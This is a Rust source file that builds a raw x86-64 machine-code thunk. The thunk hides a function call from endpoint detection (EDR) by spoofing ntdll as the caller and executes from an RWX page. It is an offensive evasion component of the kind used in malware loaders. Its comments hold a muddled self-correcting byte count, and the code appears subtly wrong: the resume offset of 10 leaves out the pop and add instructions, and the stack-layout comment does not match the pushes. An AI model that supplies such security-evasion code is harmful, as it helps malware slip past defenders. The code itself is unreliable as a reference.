//! Caller-spoof thunk — raw x86-64 machine code, no inline asm.
//!
//! Built as raw bytes to avoid GNU/Intel syntax fights on windows-gnu.
//! Placed on a RWX page and executed via transmute.
//!
//! # Stack layout (bare-RET proxy)
//!
//! Uses any `C3` (RET) byte in ntdll `.text` as the fake return address.
//! The callee returns to the ntdll RET, which pops our resume address.
//!
//! ```text
//! [RSP+0x00] = fake_ret        ← callee RET → ntdll RET
//! [RSP+0x08] = resume_addr     ← ntdll RET → resume
//! [RSP+0x10] = saved r15..rbx  ← resume: pop → restore
//! [RSP+0x50] = original ret    ← our RET → caller
//! ```

#![cfg(target_os = "windows")]

use crate::heap::Vec;

pub const THUNK_MAX: usize = 256;

pub struct Thunk { pub bytes: Vec<u8>, pub len: usize }

/// Build a caller-spoof trampoline.
///
/// `stub_addr` = absolute address of a `RET` (C3) byte in ntdll `.text`
/// `target`    = absolute address of the function to call
/// `a1..a4`    = arguments (rcx, rdx, r8, r9)
///
/// Returns a Thunk that, when called as `extern "system" fn() -> usize`,
/// invokes `target(a1,a2,a3,a4)` with the EDR seeing ntdll as the caller.
pub fn build(
    stub_addr: usize,
    target: usize,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
) -> Thunk {
    let mut b = Vec::with_capacity(THUNK_MAX);

    // === Data block (24 bytes at offset 0x00) ===
    // +0x00: stub_addr (fake return → ntdll RET)
    b.extend(&(stub_addr as u64).to_le_bytes());
    // +0x08: target address
    b.extend(&(target as u64).to_le_bytes());
    // +0x10: a1..a4 (not stored in data, passed via registers)
    // Leave 8 bytes padding for alignment.
    b.extend(&(0u64).to_le_bytes());

    // Code starts at offset 0x18.
    // Data is at thunk_page. So data = RIP - 0x18 when RIP = thunk_page + 0x18.
    // LEA R10, [RIP - 0x18 - 7] → where 7 = length of LEA instruction.
    let data_rel: i32 = -(0x18i32 + 7i32);

    // lea r10, [rip + data_rel]   ; r10 = &data[0]
    b.push(0x4C); b.push(0x8D); b.push(0x15);
    b.extend(&data_rel.to_le_bytes());

    // Save non-volatile registers (System V / Microsoft both require these).
    b.push(0x53); // push rbx
    b.push(0x55); // push rbp
    b.push(0x57); // push rdi
    b.push(0x56); // push rsi
    b.push(0x41); b.push(0x54); // push r12
    b.push(0x41); b.push(0x55); // push r13
    b.push(0x41); b.push(0x56); // push r14
    b.push(0x41); b.push(0x57); // push r15

    // Set up args. For syscall-style functions: rcx, rdx, r8, r9.
    // We use rax as scratch for loading args.

    // mov rcx, a1
    if a1 == 0 {
        b.push(0x48); b.push(0x31); b.push(0xC9); // xor ecx, ecx
    } else {
        b.push(0x48); b.push(0xB9); // mov rcx, imm64
        b.extend(&(a1 as u64).to_le_bytes());
    }
    // mov rdx, a2
    if a2 == 0 {
        b.push(0x48); b.push(0x31); b.push(0xD2); // xor edx, edx
    } else {
        b.push(0x48); b.push(0xBA); // mov rdx, imm64
        b.extend(&(a2 as u64).to_le_bytes());
    }
    // mov r8, a3
    if a3 == 0 {
        b.push(0x4D); b.push(0x31); b.push(0xC0); // xor r8, r8
    } else {
        b.push(0x49); b.push(0xB8); // mov r8, imm64
        b.extend(&(a3 as u64).to_le_bytes());
    }
    // mov r9, a4
    if a4 == 0 {
        b.push(0x4D); b.push(0x31); b.push(0xC9); // xor r9, r9
    } else {
        b.push(0x49); b.push(0xB9); // mov r9, imm64
        b.extend(&(a4 as u64).to_le_bytes());
    }

    // Compute resume address (after the jmp below).
    // We use call/pop: call +0; pop rax; add rax, offset_to_resume
    // call $+5 (E8 00 00 00 00) — pushes return address, then execution
    // falls through to the next instruction.
    b.push(0xE8); b.push(0x00); b.push(0x00); b.push(0x00); b.push(0x00);

    // RIP is now at the instruction after the call (= pop rax).
    // pop rax → rax = address of this pop instruction
    b.push(0x58); // pop rax

    // The resume label is 25 bytes ahead from here:
    //   push rax (1) + push [r10] (3) + mov rax,[r10+8] (4) + jmp rax (2)
    //   + resume: add rsp,0 (0) + pop r15..rbx (8*2=16) + ret (1)
    // Wait, let me count more carefully:
    //   After pop rax:
    //   push rax                  = 1 byte  (50)
    //   push qword [r10+0x00]     = 3 bytes (41 FF 72 00) — no, [r10] is 41 FF 32 = 3 bytes? 
    //   Actually: FF 32 = push [rdx]. For r10: 41 FF 32 = push [r10]
    //   Wait: 41 FF 32 = push QWORD PTR [r10] — 3 bytes
    //   Then: mov rax, [r10+0x08] = 4 bytes: 49 8B 42 08 (mov rax, [r10+8])  → wait, that's wrong.
    //   49 8B 42 08 = mov rax, [r10+8] — yes, 4 bytes.
    //   Then: jmp rax = 2 bytes (FF E0)
    //   Then resume:
    //   pop r15..rbx = 8 pops * (1 or 2 bytes each). For r8-r15: 2 bytes (41 5F etc). For rbx-rsi: 1 byte.
    //   r15=41 5F, r14=41 5E, r13=41 5D, r12=41 5C, rsi=5E, rdi=5F, rbp=5D, rbx=5B
    //   = 2+2+2+2+1+1+1+1 = 12 bytes
    //   ret = 1 byte (C3)
    //
    // Total from pop rax to resume = 1 + 3 + 4 + 2 = 10 bytes
    // (push rax, push [r10], mov rax [r10+8], jmp rax)

    let offset_to_resume: u8 = 10; // 1 + 3 + 4 + 2

    // add rax, offset_to_resume
    b.push(0x48); b.push(0x83); b.push(0xC0); // add rax, imm8
    b.push(offset_to_resume);

    // rax now = address of the `resume` label below.
    // Push resume address (stub's RET will pop this).
    b.push(0x50); // push rax

    // Push fake_ret = [r10+0x00] (ntdll RET stub address).
    b.push(0x41); b.push(0xFF); b.push(0x32); // push qword [r10]

    // Load target = [r10+0x08] into rax.
    b.push(0x49); b.push(0x8B); b.push(0x42); b.push(0x08); // mov rax, [r10+8]

    // jmp rax → target(a1,a2,a3,a4)
    b.push(0xFF); b.push(0xE0);

    // === resume (reached after callee RET → ntdll RET) ===
    // Restore non-volatile registers in reverse order.
    b.push(0x41); b.push(0x5F); // pop r15
    b.push(0x41); b.push(0x5E); // pop r14
    b.push(0x41); b.push(0x5D); // pop r13
    b.push(0x41); b.push(0x5C); // pop r12
    b.push(0x5E); // pop rsi
    b.push(0x5F); // pop rdi
    b.push(0x5D); // pop rbp
    b.push(0x5B); // pop rbx

    // Return to original caller. RAX = return value from target.
    b.push(0xC3); // ret

    let len = b.len();
    Thunk { bytes: b, len }
}
